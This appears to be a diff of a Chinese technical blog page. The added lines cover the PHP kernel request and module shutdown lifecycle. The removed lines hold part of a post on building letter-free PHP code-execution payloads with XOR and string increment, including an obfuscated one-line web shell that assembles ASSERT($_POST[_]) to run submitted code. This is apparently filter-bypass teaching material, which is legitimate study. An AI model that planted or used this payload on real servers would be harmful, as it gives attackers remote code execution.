+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_RSHUTDOWN_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 例如记录请求结束时间，并把相应的信息写入到日至文件中。</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
-
-<p>（脚本绝赞升级中）</p>
-<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>
-
-<p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
-<p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p>
-<p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure>
-
-<p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p>
-<p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure>
-
-<p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p>
-<p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p>
-<p>真搞事还得是<code>system()</code>啊（确信</p>
-<p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>
+<p><strong>Module shutdown (MSHUTDOWN):</strong></p>
+<p>当RSHUTDOWN完成后，php继续等待SAPI的其他文档请求或者是关闭信号。对于CGI和CLI等SAPI，没有“下一个请求”，所以SAPI立刻开始关闭。关闭期间，php再次遍历每个扩展，调用其模块关闭函数，并最终关闭自己的内核子系统。</p>
+<h1><span id="外部链接">外部链接</span></h1><p>[1] <a target="_blank" rel="noopener" href="https://github.com/php/php-src/tags">php-src-tags</a></p>
 
       
     </div>
@@ -432,7 +431,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php-rce/" rel="tag"># php-rce</a>
+            <a href="/tags/php74-kernel/" rel="tag"># php74-kernel</a>
           
         </div>
       
@@ -445,8 +444,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/03/09/computer_networks_basic/" rel="next" title="计算机网络概念入门">
-                <i class="fa fa-chevron-left"></i> 计算机网络概念入门
+              <a href="/2022/10/31/php_carafeat/" rel="next" title="php传参特殊字符替换特性源码简析">
+                <i class="fa fa-chevron-left"></i> php传参特殊字符替换特性源码简析
               </a>
             
           </div>
@@ -454,10 +453,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2022/09/19/readFileSync/" rel="prev" title="一个fs.readFileSync的trick浅析">
-                一个fs.readFileSync的trick浅析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -668,7 +663,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">取反</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">异或</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">自增</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">主要目录结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">php全局变量宏</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">SAPI接口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">php生命周期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">外部链接</span></a></li></ol></div>
             
 
           </div>
